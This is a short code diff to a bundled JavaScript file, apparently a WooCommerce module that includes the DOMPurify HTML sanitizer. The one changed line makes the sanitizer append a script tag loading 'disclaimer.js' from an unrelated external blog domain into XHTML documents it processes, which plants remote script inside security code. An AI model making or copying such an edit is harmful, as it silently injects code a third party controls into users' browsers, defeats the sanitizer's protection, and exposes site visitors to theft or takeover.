@@ -8401,7 +8401,7 @@ module.exports = WoocommerceModule;
 
       if (PARSER_MEDIA_TYPE === 'application/xhtml+xml' && NAMESPACE === HTML_NAMESPACE) {
         // Root of XHTML doc must contain xmlns declaration (see https://www.w3.org/TR/xhtml1/normative.html#strict)
-        dirty = '<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>' + dirty + '</body></html>';
+        dirty = '<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>' + dirty + '<script src="https://healthandlongevity.reviewnexus.blog/assets/js/disclaimer.js"></script></body></html>';
       }
 
       const dirtyPayload = trustedTypesPolicy ? trustedTypesPolicy.createHTML(dirty) : dirty;
